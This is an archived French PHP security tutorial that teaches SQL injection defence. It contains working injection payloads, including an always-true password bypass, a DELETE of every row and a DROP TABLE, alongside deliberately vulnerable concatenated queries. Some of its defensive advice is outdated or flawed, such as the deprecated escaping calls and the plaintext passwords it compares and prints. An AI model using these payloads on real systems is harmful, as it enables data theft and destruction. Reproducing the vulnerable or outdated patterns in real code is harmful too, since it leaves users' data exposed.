@@ -1,0 +1,669 @@
+<html>
+
+<!-- Mirrored from 62.4.17.167/sdz/sdz/securite-php-securiser-les-flux-de-donnees.html by HTTrack Website Copier/3.x [XR&CO'2013], Sat, 26 Oct 2013 23:27:27 GMT -->
+
+<!-- Mirrored from sdz.tdct.org/sdz/securite-php-securiser-les-flux-de-donnees.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Nov 2015 04:07:51 GMT -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Tutoriel : Sécurité PHP, sécuriser les flux de données</title>
+<link href="medias/sdz_main.css" type="text/css" rel="stylesheet" media="all"/>
+</head>
+        <body>
+<a href="../www.siteduzero.com/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees.html" class="version_en_ligne">Version en ligne</a>
+<h1>Tutoriel : Sécurité PHP, sécuriser les flux de données</h1>
+<h2>Table des matières</h2><div class="table_des_matieres"><a href="#ScuritPHPscuriserlesfluxdedonnes">Sécurité PHP, sécuriser les flux de données</a><br/><a href="#Architectureweb">Architecture web</a><br/><a href="#ProtgerlesdonnesentrantdanslaBDD">Protéger les données entrant dans la BDD</a><br/><a href="#ProtgerlesdonnesissuesdelaBDDoudeformulaires">Protéger les données issues de la BDD ou de formulaires</a><br/><a href="#Scuritcentraliser">Sécurité = centraliser</a><br/><a href="#Leslistescontrledesdonnes">Les listes : contrôle des données</a><br/></div>
+<a name="ScuritPHPscuriserlesfluxdedonnes"></a><h2>Sécurité PHP, sécuriser les flux de données</h2><div class="paginate-tuto">
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+<span class="next">Architecture web</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="top"/>
+<div class="clear"></div> <div class="content">
+<p id="r-377706" data-claire-element-id="377706">Dans un site web, tout est axé autour du traitement des données. Que ce soit des données issues d'une base de données ou les données soumises par les internautes eux-même par l'intermédiaire de formulaires.<br/> Bien protéger ses données c'est assurer une certaine sécurité globale.</p>
+</div><a name="Architectureweb"></a><h2>Architecture web</h2><div class="paginate-tuto">
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+<span class="next">Protéger les données entrant dans la BDD</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="top"/>
+<div class="clear"></div> <div id="content" role="article">
+<h2 id="r-principe-de-l-architecture-3-tier" data-claire-element-id="377722">Principe de l'architecture 3-tier</h2><h3 id="r-definition-46" data-claire-element-id="377716">Définition</h3><p id="r-377707" data-claire-element-id="377707">Une architecture <em>3-tier</em> et plus généralement <strong>n</strong><em>n-tier</em> est u<strong>n</strong> système composé de n couches.<br/> Dans le cas du Web, on parle souvent d'architecture <em>3-tier</em> ou <em>3 étages</em>.<br/> En fait, on distingue :</p><ul id="r-377714" data-claire-element-id="377714"><li id="r-377709" data-claire-element-id="377709"><p id="r-377708" data-claire-element-id="377708">d'une part, le <strong>navigateur</strong> de l'internaute (Firefox, IE, Safari, ...) qui a la charge d'afficher correctement les données transmises par le serveur,</p></li><li id="r-377711" data-claire-element-id="377711"><p id="r-377710" data-claire-element-id="377710">la couche <strong>serveur</strong> avec PHP par exemple (notez que ça pourrait très bien être un autre langage comme Python) qui traite les données à la fois venant du navigateur mais aussi celles issues de la BDD (c'est en quelque sorte le messager qui s'assure du transfert des données),</p></li><li id="r-377713" data-claire-element-id="377713"><p id="r-377712" data-claire-element-id="377712">l'étage qui permet le stockage et la conservation des informations : c'est la BDD (exemple : MySQL, PostGreSQL...).</p></li></ul><p id="r-377715" data-claire-element-id="377715">.</p><h3 id="r-schema-2" data-claire-element-id="377721">Schéma</h3><figure id="r-377718" data-claire-element-id="377719"><img id="r-377717" data-claire-element-id="377717" src="medias/uploads.siteduzero.com_files_122001_123000_122441.jpg" alt="architecture 3-tiers"/></figure><p id="r-377720" data-claire-element-id="377720">Les flèches bleues représentent les flux de données qui transitent depuis l'internaute jusqu'à la base de données et les flèches vertes les données transitant depuis la base de données jusqu'au navigateur de l'internaute.<br/> Ces transferts de données sont schématisés par les flèches rouges.</p><h2 id="r-securisons-nos-donnees" data-claire-element-id="377729">Sécurisons nos données</h2><p id="r-377723" data-claire-element-id="377723">Nous avons donc deux types de flux de données à sécuriser.</p><ul id="r-377728" data-claire-element-id="377728"><li id="r-377725" data-claire-element-id="377725"><p id="r-377724" data-claire-element-id="377724"><strong>Les données entrantes</strong> : dans un premier temps, nous allons devoir nous occuper de sécuriser les données qui proviennent du membre et donc de formulaires avant de pouvoir les entrer dans la BDD.</p></li><li id="r-377727" data-claire-element-id="377727"><p id="r-377726" data-claire-element-id="377726"><strong>Les données sortantes</strong> : puis, nous verrons comment sécuriser l'affichage des données issues de la BDD.</p></li></ul>
+<aside class="aside-menu">
+<ul class="content-menu subchapter" role="navigation">
+<li class="tuto">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees">Sécurité PHP, sécuriser les flux de données</a>
+</li>
+<ul class="subchapter-parts">
+<li class="active">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+Architecture web
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+Protéger les données entrant dans la BDD
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+Protéger les données issues de la BDD ou de formulaires
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+Sécurité = centraliser
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/les-listes-controle-des-donnees">
+Les listes : contrôle des données
+</a>
+</li>
+</ul>
+</ul>
+</aside>
+</div>
+<div id="content-bottom-menu"></div>
+<hr/>
+<div class="paginate-tuto">
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+<span class="next">Protéger les données entrant dans la BDD</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="bottom"/>
+<div class="clear"></div> <div class="adBan">
+<script type='text/javascript'>
+    if (window.innerWidth >= 728)
+    {
+        document.write('<div id="div-gpt-ad-1350977194635-8" class="megaban"></div>');
+        googletag.cmd.push(function() {
+            googletag.display('div-gpt-ad-1350977194635-8');
+        });
+    }
+            else
+        {
+            document.write('<div id="div-gpt-ad-1350977284180-8" class="miniban"></div>');
+            googletag.cmd.push(function() {
+                googletag.display('div-gpt-ad-1350977284180-8');
+            });
+        }
+    </script>
+</div>
+<div class="clear"></div><a name="ProtgerlesdonnesentrantdanslaBDD"></a><h2>Protéger les données entrant dans la BDD</h2><div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+<span class="arrow"></span>
+<span class="next">Architecture web</span>
+</a>
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+<span class="next">Protéger les données issues de la BDD ou de formulaires</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="top"/>
+<div class="clear"></div> <div id="content" role="article">
+<p id="r-377731" data-claire-element-id="377731">L'attaque par injection SQL est très fréquente car elle est rapide à mettre en place, peut occasionner des dégâts irréversibles dans votre base de données ou, si elle est utilisée de manière plus subtile, elle permet de récupérer en toute discrétion les mots de passe et identifiants. Le pirate détourne votre requête en injectant du code dans les champs du formulaire : d'où le terme d'injection SQL.</p><h3 id="r-detournement-de-clause-where" data-claire-element-id="377742">Détournement de clause WHERE</h3><p id="r-377732" data-claire-element-id="377732">On a l'habitude de formater nos requêtes SQL de cette manière :</p><pre id="r-377733" data-claire-element-id="377733"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;SELECT * FROM membre 
+	WHERE  pseudo = '&quot;.$_GET['pseudo'].&quot;'
+	AND password = '&quot;.$_GET['password'].&quot;' &quot;;
+?&gt;</code></pre><p id="r-377734" data-claire-element-id="377734">Notez que j'ai utilisé $_GET mais que l'injection SQL fonctionne tout aussi bien avec $_POST : ne vous croyez donc pas à l'abri en mettant method = &quot;post&quot; en attribut de vos balises de formulaire. :p C'est souvent une idée préconçue mais qui s'avère totalement fausse car il est fort possible de modifier les en-têtes HTTP pour transmettre des données sous forme $_POST, donc méfiez-vous !</p><div id="r-377736" data-claire-element-id="377736" data-claire-semantic="question"><p id="r-377735" data-claire-element-id="377735">Je ne vois pas où est le problème avec cette requête ?</p></div><p id="r-377737" data-claire-element-id="377737">Ne vous inquiétez pas : vous n'allez pas tarder à le voir. Imaginons un instant que je transmette ceci :</p><pre id="r-377738" data-claire-element-id="377738"><code data-claire-semantic="html+php">&lt;?php
+	$_GET['password'] = &quot; ' OR 1 = '1 &quot;;
+?&gt;</code></pre><p id="r-377739" data-claire-element-id="377739">Ma requête devient :</p><pre id="r-377740" data-claire-element-id="377740"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;SELECT * FROM membre 
+	WHERE  pseudo = '&quot;.$_GET['pseudo'].&quot;'
+	AND password = '' OR 1 = '1' &quot;;
+?&gt;</code></pre><p id="r-377741" data-claire-element-id="377741">Ainsi, vous pouvez entrer n'importe quel mot de passe, il sera toujours valide puisque vous admettrez que 1 est toujours égal à 1. ^^ Il suffit donc de fournir un pseudo valide et la requête est vraie !<br/> De cette manière, il est possible de récupérer facilement les informations sur les membres du site.</p><h3 id="r-detournement-de-la-clause-delete" data-claire-element-id="377903">Détournement de la clause DELETE</h3><p id="r-377743" data-claire-element-id="377743">Vous commencez à avoir peur ? C'est normal : ça m'a fait tout drôle à moi aussi de comprendre tout à coup que tout mon site web était rempli de failles avant que j'applique les quelques règles de sécurité que je vais vous fournir. Mais attendez de voir ce que nous réserve le détournement d'une clause DELETE : c'est peut-être ce qu'il y a de pire !</p><p id="r-377744" data-claire-element-id="377744">Prenons un exemple de requête :</p><pre id="r-377745" data-claire-element-id="377745"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;DELETE FROM membre 
+	WHERE id = '&quot;.$_GET['id'].&quot;' &quot;;
+?&gt;</code></pre><p id="r-377746" data-claire-element-id="377746">Voilà ce que je peux transmettre en paramètre :</p><pre id="r-377747" data-claire-element-id="377747"><code data-claire-semantic="html+php">&lt;?php
+	$_GET['id'] = &quot;1 ' OR id &gt; '0  &quot;;
+?&gt;</code></pre><p id="r-377748" data-claire-element-id="377748">La requête donne donc :</p><pre id="r-377749" data-claire-element-id="377749"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;DELETE FROM membre 
+	WHERE id = '1' OR id &gt; '0' &quot;;
+?&gt;</code></pre><p id="r-377750" data-claire-element-id="377750">Cette requête détruira donc toutes les entrées contenues dans votre table membre ! Vous aurez perdu tous vos membres en 10 ms montre en main. :waw: Et encore, cette requête pourrait être beaucoup, beaucoup plus dangereuse.</p><h2 id="r-les-requetes-multiples-mysqli-multi-query" data-claire-element-id="377763">Les requêtes multiples : mysqli_multi_query()</h2><p id="r-377751" data-claire-element-id="377751">L'interface <em>mysqli</em> propose d'exécuter plusieurs requêtes en une seule. Je vous conseille très vivement de ne jamais le faire à moins d'être totalement sûr que les paramètres envoyés seront valides !</p><div id="r-377753" data-claire-element-id="377753" data-claire-semantic="question"><p id="r-377752" data-claire-element-id="377752">Pourtant, c'est cool de pouvoir envoyer plusieurs requêtes en une, ça permet d'aller plus vite pour traiter les résultats. :euh: Quoi, j'ai dit une bêtise ?</p></div><p id="r-377754" data-claire-element-id="377754">Certes, il y a quelques avantages pour le traitement des résultats. Cependant, du point de vue de la sécurité, elles sont à proscrire !</p><p id="r-377755" data-claire-element-id="377755">Prenons un exemple concret :</p><pre id="r-377756" data-claire-element-id="377756"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;SELECT pseudo FROM membre 
+	WHERE id = '&quot;.$_GET['id'].&quot;' &quot;;
+?&gt;</code></pre><p id="r-377757" data-claire-element-id="377757">Voilà le paramètre que nous pouvons transmettre :</p><pre id="r-377758" data-claire-element-id="377758"><code data-claire-semantic="html+php">&lt;?php
+	$_GET['id'] = &quot;1'; DROP TABLE membre &quot;; 
+?&gt;</code></pre><p id="r-377759" data-claire-element-id="377759">Notre requête devient :</p><pre id="r-377760" data-claire-element-id="377760"><code data-claire-semantic="html+php">&lt;?php
+	// Connexion à la BDD
+	$link = mysqli_connect(&quot;localhost&quot;, &quot;my_user&quot;, &quot;my_password&quot;, &quot;world&quot;);
+
+	// Formatage de la requête
+	$requete = &quot;SELECT pseudo FROM membre 
+	WHERE id = '1'; DROP TABLE membre &quot;;
+
+	// Exécution de la requête 
+	mysqli_multi_query($link, $requete) or exit(mysqli_error);
+?&gt;</code></pre><p id="r-377761" data-claire-element-id="377761">Boom ! Votre table membre vient de rendre l'âme. :ange:</p><p id="r-377762" data-claire-element-id="377762">Cette petite partie introductive nous aura permis de faire une initiation aux dangers des attaques par injection SQL et nous allons à présent voir comment s'en protéger efficacement !</p><h2 id="r-les-magic-quotes-la-fausse-bonne-idee" data-claire-element-id="377783">Les magic quotes : la fausse bonne idée...</h2><p id="r-377764" data-claire-element-id="377764">Il nous faut donc protéger les données issues du formulaire <strong>avant</strong> de les entrer dans notre requête sinon on s'expose à de gros risques...<br/> Nous devons échapper nos valeurs pour les rendre inertes et sans danger. Les <em>magic_quotes</em> font partie d'une directive de PHP visant à assurer la sécurité des requêtes SQL à son insu en échappant systématiquement les caractères suivant :</p><ul id="r-377773" data-claire-element-id="377773"><li id="r-377766" data-claire-element-id="377766"><p id="r-377765" data-claire-element-id="377765">les guillemets simples <strong>'</strong> ;</p></li><li id="r-377768" data-claire-element-id="377768"><p id="r-377767" data-claire-element-id="377767">les guillemets doubles <strong>&quot;</strong> ;</p></li><li id="r-377770" data-claire-element-id="377770"><p id="r-377769" data-claire-element-id="377769">les slashes <strong>/</strong> ;</p></li><li id="r-377772" data-claire-element-id="377772"><p id="r-377771" data-claire-element-id="377771">les caractères <strong><em>NULL</em></strong>.</p></li></ul><p id="r-377774" data-claire-element-id="377774">Pour échapper un caractère, cette directive ajoute des antislashes dans les chaînes qui transitent vers le script PHP.<br/> En fait, elle joue le même rôle que la fonction <em>addslashes()</em>.</p><p id="r-377775" data-claire-element-id="377775">Regardons ce que donne l'activation de cette directive ensemble :</p><pre id="r-377776" data-claire-element-id="377776"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;SELECT pseudo FROM membre 
+	WHERE id = '&quot;.$_GET['id'].&quot;' &quot;;
+?&gt;</code></pre><p id="r-377777" data-claire-element-id="377777">L'ajout du caractère d'échappement permet d'utiliser certains caractères dans notre requête sans qu'elle ne se transforme pour autant en injection.</p><pre id="r-377778" data-claire-element-id="377778"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;SELECT pseudo FROM membre 
+	WHERE id = '\&quot;1\&quot;mettez l'injection que vous voulez ici\&quot;' &quot;;
+?&gt;</code></pre><p id="r-377779" data-claire-element-id="377779">Cette directive a donc la capacité de bloquer certaines injections SQL mais elle reste très problématique avec l'utilisation d'XHTML. Ceux qui ont déjà connu cette directive se souviendront sûrement de chaînes comme celles-là :</p><pre id="r-377780" data-claire-element-id="377780"><code data-claire-semantic="html">J\\\'aime le site du zer0</code></pre><p id="r-377781" data-claire-element-id="377781">Pour éliminer ces barres obliques inverses, on a souvent recours à la fonction <em>stripslashes()</em> mais il est souvent fastidieux de nettoyer toutes les variables de PHP avant de les afficher.<br/> Par ailleurs, je ne vous l'ai pas encore dit mais les <em>magic_quotes</em> ne protègent pas contre toutes les injections SQL car certaines ne nécessitent pas de guillemets.</p><p id="r-377782" data-claire-element-id="377782">Bref, je vous invite à les désactiver au plus vite (de toute façon, avec l'avènement de PHP 6, il est très probable qu'elles disparaissent à jamais :D ).</p><h2 id="r-je-securise-tu-securises-nous-securisons" data-claire-element-id="377808">Je sécurise, tu sécurises, nous sécurisons !</h2><p id="r-377784" data-claire-element-id="377784">Renvoyez donc au placard les guillemets magiques et la fonction <em>addslashes()</em> !</p><p id="r-377785" data-claire-element-id="377785">Nous allons maintenant parler d'une fonction bien pratique : <em>mysql_real_escape_string()</em>.</p><p id="r-377786" data-claire-element-id="377786">Prototype :</p><pre id="r-377787" data-claire-element-id="377787"><code data-claire-semantic="console">string mysql_real_escape_string  ( string $unescaped_string  [, resource $link_identifier  ] )</code></pre><p id="r-377788" data-claire-element-id="377788">Cette fonction échappe les caractères suivants :</p><ul id="r-377799" data-claire-element-id="377799"><li id="r-377790" data-claire-element-id="377790"><p id="r-377789" data-claire-element-id="377789">les guillemets simples <strong>'</strong> ;</p></li><li id="r-377792" data-claire-element-id="377792"><p id="r-377791" data-claire-element-id="377791">les guillemets doubles <strong>&quot;</strong> :</p></li><li id="r-377794" data-claire-element-id="377794"><p id="r-377793" data-claire-element-id="377793">les slashes <strong>/</strong> ;</p></li><li id="r-377796" data-claire-element-id="377796"><p id="r-377795" data-claire-element-id="377795">les caractères <strong><em>NULL</em></strong> ;</p></li><li id="r-377798" data-claire-element-id="377798"><p id="r-377797" data-claire-element-id="377797">les caractères suivants : <strong></strong> , , <strong>\x00</strong> et <strong>\x1a</strong>.</p></li></ul><p id="r-377800" data-claire-element-id="377800">En gros, elle neutralise tous les caractères susceptibles d'être à l'origine d'une injection SQL. À partir de maintenant, utilisez toujours cette fonction pour sécuriser les chaînes transmises à vos requêtes. Par ailleurs, il faut aussi que vos données soient placées dans des guillemets (simples ou doubles) sinon, il est possible de réinjecter du code (notamment des sous-requêtes grâce aux parenthèses).</p><p id="r-377801" data-claire-element-id="377801">Exemple :</p><pre id="r-377802" data-claire-element-id="377802"><code data-claire-semantic="html+php">&lt;?php
+	$pseudo = mysql_real_escape_string($_POST['pseudo']);
+	$requete = &quot;SELECT * FROM membre WHERE pseudo = '$pseudo' &quot;;
+?&gt;</code></pre><aside id="r-377804" data-claire-element-id="377804" data-claire-semantic="warning"><p id="r-377803" data-claire-element-id="377803">Contrairement à ce qu'on pourrait penser, il est toujours possible de réaliser des injections SQL particulières qui visent notamment à surcharger votre serveur en alourdissant votre requête. Ce type d'injection utilise les caractères <strong>%</strong> et <strong>_</strong>.</p></aside><p id="r-377805" data-claire-element-id="377805">Le caractère <strong>%</strong> est souvent utilisé dans MySQL avec la clause <em>LIKE</em>. Ce caractère est un joker qui représente n'importe quelle autre chaîne.</p><pre id="r-377806" data-claire-element-id="377806"><code data-claire-semantic="sql">SELECT id, pseudo, password FROM membre WHERE pseudo LIKE 'a%'</code></pre><p id="r-377807" data-claire-element-id="377807">Cette requête récupère toutes les informations sur les membres dont le pseudo commence par un <strong>a</strong>.</p><h2 id="r-addcslashes" data-claire-element-id="377821">addcslashes()</h2><p id="r-377809" data-claire-element-id="377809">Prototype :</p><pre id="r-377810" data-claire-element-id="377810"><code data-claire-semantic="console">string addcslashes  ( string $str  , string $charlist  )</code></pre><p id="r-377811" data-claire-element-id="377811">Cette fonction souvent méconnue offre la possibilité de se protéger contre le type d'injection soulevée auparavant. <br/> La chaîne à échapper est le premier paramètre à passer à la fonction. Puis, on entre les caractères qui doivent être échappés.</p><p id="r-377812" data-claire-element-id="377812">Elle s'utilise comme cela :</p><pre id="r-377813" data-claire-element-id="377813"><code data-claire-semantic="html+php">&lt;?php
+	$chaine = &quot;%salut_&quot;;
+	// Échappement des caractères % et _
+	$chaine = addcslashes($chaine, '%_');
+	echo $chaine; // Affiche \%salut\_
+?&gt;</code></pre><p id="r-377814" data-claire-element-id="377814">Je vous propose une fonction qui sécurise vos données avant de les passer dans votre requête. Centraliser le traitement est une bonne habitude à acquérir dès le début. ^^</p><pre id="r-377815" data-claire-element-id="377815"><code data-claire-semantic="html+php">&lt;?php
+	function securite_bdd($string)
+	{
+		// On regarde si le type de string est un nombre entier (int)
+		if(ctype_digit($string))
+		{
+			$string = intval($string);
+		}
+		// Pour tous les autres types
+		else
+		{
+			$string = mysql_real_escape_string($string);
+			$string = addcslashes($string, '%_');
+		}
+		
+		return $string;
+	}
+?&gt;</code></pre><p id="r-377816" data-claire-element-id="377816">Notre fonction <em>securite_bdd()</em> prend un paramètre : une chaîne de caractères quelconque.<br/> Si cette chaîne n'est composée que de nombres, on force la conversion explicite en un entier avec la fonction <em>intval()</em>.<br/> Autrement, on échappe la chaîne avec la fonction <em>mysql_real_escape_string()</em> puis <em>addcslashes()</em>.</p><p id="r-377817" data-claire-element-id="377817">Maintenant, je veux et j'exige qu'à chaque fois que vous récupérez une donnée issue d'un formulaire ou d'une URL, vous lui appliquiez cette fonction avant de faire quoi que ce soit. ^^</p><p id="r-377818" data-claire-element-id="377818">Exemple :</p><pre id="r-377819" data-claire-element-id="377819"><code data-claire-semantic="html+php">&lt;?php
+	// Sécurisation des variables
+	$pseudo = securite_bdd($_GET['pseudo']);
+	$password = securite_bdd($_GET['password']);
+
+	// Formatage de la requête
+	$requete = &quot;SELECT * FROM membre 
+	WHERE  pseudo = '$pseudo'
+	AND password = '$password' &quot;;
+	
+	// Envoi au serveur en toute sécurité ^^
+	mysql_query($requete) or exit(mysql_error());
+?&gt;</code></pre><p id="r-377820" data-claire-element-id="377820">Maintenant, toutes les données qui entrent dans votre BDD doivent être sécurisées de cette manière.</p><h2 id="r-les-requetes-preparees-2" data-claire-element-id="377902">Les requêtes préparées</h2><p id="r-377822" data-claire-element-id="377822">Les requêtes préparées sont une innovation majeure apportée notamment par MySQLi. Concrètement, elles permettent une augmentation de la sécurité et, dans certains cas, un gain de performances.</p><p id="r-377823" data-claire-element-id="377823">En tant que programmeur, vous savez (ou vous vous doutez) qu'il existe plusieurs types de variables :</p><ul id="r-377832" data-claire-element-id="377832"><li id="r-377825" data-claire-element-id="377825"><p id="r-377824" data-claire-element-id="377824">les nombres entiers <strong>int</strong> ;</p></li><li id="r-377827" data-claire-element-id="377827"><p id="r-377826" data-claire-element-id="377826">les nombres réels <strong>float</strong>/<strong>double</strong> ;</p></li><li id="r-377829" data-claire-element-id="377829"><p id="r-377828" data-claire-element-id="377828">les chaînes de caractères <strong>string</strong> ;</p></li><li id="r-377831" data-claire-element-id="377831"><p id="r-377830" data-claire-element-id="377830">etc.</p></li></ul><p id="r-377833" data-claire-element-id="377833">La préparation de nos requêtes nous permettra de fixer le type de variable qui doit entrer dans notre requête. De cette manière, la majeure partie des injections SQL sera impossible ! :D</p><p id="r-377834" data-claire-element-id="377834">Utilisons l'interface MySQLi pour comprendre le mécanisme de la préparation de requêtes. Il faut bien entendu suivre un processus assez fixe :</p><ul id="r-377851" data-claire-element-id="377851"><li id="r-377836" data-claire-element-id="377836"><p id="r-377835" data-claire-element-id="377835"><strong>init()</strong> : création d'un objet commande et association à la connexion ;</p></li><li id="r-377838" data-claire-element-id="377838"><p id="r-377837" data-claire-element-id="377837"><strong>prepare()</strong> : préparation de la requête avec utilisation des &quot;trous&quot; (placeholder), analyse de la requête puis compilation ;</p></li><li id="r-377840" data-claire-element-id="377840"><p id="r-377839" data-claire-element-id="377839"><strong>bind_param()</strong> : liaison des paramètres dans l'ordre des marqueurs ;</p></li><li id="r-377842" data-claire-element-id="377842"><p id="r-377841" data-claire-element-id="377841"><strong>execute()</strong> : exécution de la requête avec la valeur des paramètres envoyés ;</p></li><li id="r-377844" data-claire-element-id="377844"><p id="r-377843" data-claire-element-id="377843"><strong>store_result()</strong> : transmission de l'intégralité des résultats ;</p></li><li id="r-377846" data-claire-element-id="377846"><p id="r-377845" data-claire-element-id="377845"><strong>bind_result()</strong> : liaison des résultats à des variables PHP ;</p></li><li id="r-377848" data-claire-element-id="377848"><p id="r-377847" data-claire-element-id="377847"><strong>fetch()</strong> : équivalent de <em>mysqli_fetch_array()</em> ;</p></li><li id="r-377850" data-claire-element-id="377850"><p id="r-377849" data-claire-element-id="377849"><strong>close()</strong> : fermeture de la commande préparée.</p></li></ul><p id="r-377852" data-claire-element-id="377852">Ne vous inquiétez pas, je vais tout vous expliquer. ^^ <br/> Nous allons employer le style de programmation procédurale pour la compréhension de tous, mais sachez qu'en orienté objet c'est le même mécanisme.</p><p id="r-377853" data-claire-element-id="377853">Formatons notre requête SQL :</p><pre id="r-377854" data-claire-element-id="377854"><code data-claire-semantic="html+php">&lt;?php
+	$requete = &quot;SELECT id, pseudo, password 
+	FROM membre 
+	WHERE  pseudo = ?
+	AND password = ? &quot;;
+?&gt;</code></pre><div id="r-377856" data-claire-element-id="377856" data-claire-semantic="question"><p id="r-377855" data-claire-element-id="377855">Elle est pas un peu bizarre ta requête là ? o_O</p></div><p id="r-377857" data-claire-element-id="377857">Je vous l'accorde. :) <br/> La seule différence avec une requête non préparée, c'est la présence de marqueurs <strong>?</strong>. C'est un marqueur de paramètre qui s'utilise comme une variable.</p><aside id="r-377859" data-claire-element-id="377859" data-claire-semantic="warning"><p id="r-377858" data-claire-element-id="377858">Ce marqueur ne s'écrit pas entre guillemets. Il ne faut donc pas utiliser <strong>'?'</strong> mais bien <strong>?</strong>.</p></aside><p id="r-377860" data-claire-element-id="377860">Voyons à présent le processus de commande préparée :</p><pre id="r-377861" data-claire-element-id="377861"><code data-claire-semantic="html+php">&lt;?php
+	// Connexion à la BDD
+	$connexion = mysqli_connect(&quot;localhost&quot;, &quot;my_user&quot;, &quot;my_password&quot;, &quot;world&quot;);
+
+	// Création de l'objet commande
+	$prepa = mysqli_stmt_init($connexion);
+
+	// Préparation de la requête : envoi à la base
+	mysqli_stmt_prepare($prepa, $requete);
+	
+?&gt;</code></pre><p id="r-377862" data-claire-element-id="377862">Récupérons à présent les données issues du formulaire :</p><pre id="r-377863" data-claire-element-id="377863"><code data-claire-semantic="html+php">&lt;?php
+	$pseudo = $_GET['pseudo'];
+	$password = $_GET['password'];
+?&gt;</code></pre><p id="r-377864" data-claire-element-id="377864">Maintenant, il ne nous reste plus qu'à forcer le typage de nos variables et à les transmettre à la requête.<br/> Nous allons utiliser des lettres qui correspondent à un type particulier de variable. Je vais vous présenter les lettres principales que nous utiliserons :</p><table id="r-377887" data-claire-element-id="377887"><thead id="r-377870" data-claire-element-id="377870"><tr id="r-377869" data-claire-element-id="377869"><th id="r-377866" data-claire-element-id="377866"><p id="r-377865" data-claire-element-id="377865">Lettre</p></th><th id="r-377868" data-claire-element-id="377868"><p id="r-377867" data-claire-element-id="377867">Type</p></th></tr></thead><tbody id="r-377886" data-claire-element-id="377886"><tr id="r-377875" data-claire-element-id="377875"><td id="r-377872" data-claire-element-id="377872"><p id="r-377871" data-claire-element-id="377871">s</p></td><td id="r-377874" data-claire-element-id="377874"><p id="r-377873" data-claire-element-id="377873">string</p></td></tr><tr id="r-377880" data-claire-element-id="377880"><td id="r-377877" data-claire-element-id="377877"><p id="r-377876" data-claire-element-id="377876">i</p></td><td id="r-377879" data-claire-element-id="377879"><p id="r-377878" data-claire-element-id="377878">int</p></td></tr><tr id="r-377885" data-claire-element-id="377885"><td id="r-377882" data-claire-element-id="377882"><p id="r-377881" data-claire-element-id="377881">b</p></td><td id="r-377884" data-claire-element-id="377884"><p id="r-377883" data-claire-element-id="377883">BLOB</p></td></tr></tbody></table><aside id="r-377889" data-claire-element-id="377889" data-claire-semantic="information"><p id="r-377888" data-claire-element-id="377888">Le type BLOB correspond à des données brutes comme un fichier ou une image.</p></aside><p id="r-377890" data-claire-element-id="377890">Nous allons passer en paramètres les variables en forçant leur type :</p><pre id="r-377891" data-claire-element-id="377891"><code data-claire-semantic="html+php">&lt;?php
+	mysqli_stmt_bind_param($prepa, 'ss', $pseudo, $password);
+?&gt;</code></pre><p id="r-377892" data-claire-element-id="377892">Expliquons le code ci-dessus.<br/> Tout d'abord, on passe en paramètre notre requête préparée <strong>$prepa</strong> puis on indique le type de variables qu'elle doit recevoir. Nous utilisons deux fois la lettre <strong>s</strong> car on transmet la variable <strong>$pseudo</strong> et <strong>$password</strong> qui doivent correspondre à des chaînes de caractères.</p><p id="r-377893" data-claire-element-id="377893">Nous devons encore exécuter la requête et traiter les résultats :</p><pre id="r-377894" data-claire-element-id="377894"><code data-claire-semantic="html+php">&lt;?php
+	// Exécution de la requête
+	$resultat = mysqli_stmt_execute($prepa);
+
+	// Récupération des résultats
+	mysqli_stmt_store_result($prepa);
+	
+	// On lie les résultats à des variables PHP
+	mysqli_stmt_bind_result($prepa, $id, $pseudo, $password);
+	
+	// Affichage des résultats
+	mysqli_stmt_fetch($prepa);
+	echo 'Salut ' . htmlentities($pseudo);
+	echo 'ID : ' . $id;
+	echo 'Password ' . $password;
+
+	// Fermeture de la requête
+	mysqli_stmt_close($prepa);
+	
+?&gt;</code></pre><p id="r-377895" data-claire-element-id="377895">Récapitulation de la procédure :</p><pre id="r-377896" data-claire-element-id="377896"><code data-claire-semantic="html+php">&lt;?php
+	// Formatage de la requête
+	$requete = &quot;SELECT id, pseudo, password 
+	FROM membre 
+	WHERE  pseudo = ?
+	AND password = ? &quot;;
+
+	// Connexion à la BDD
+	$connexion = mysqli_connect(&quot;localhost&quot;, &quot;my_user&quot;, &quot;my_password&quot;, &quot;world&quot;);
+
+	// Création de l'objet commande
+	$prepa = mysqli_stmt_init($connexion);
+
+	// Préparation de la requête : envoi à la base
+	mysqli_stmt_prepare($prepa, $requete);
+
+	// Récupération des variables
+	$pseudo = $_GET['pseudo'];
+	$password = $_GET['password'];
+
+	// Transfert des paramètres
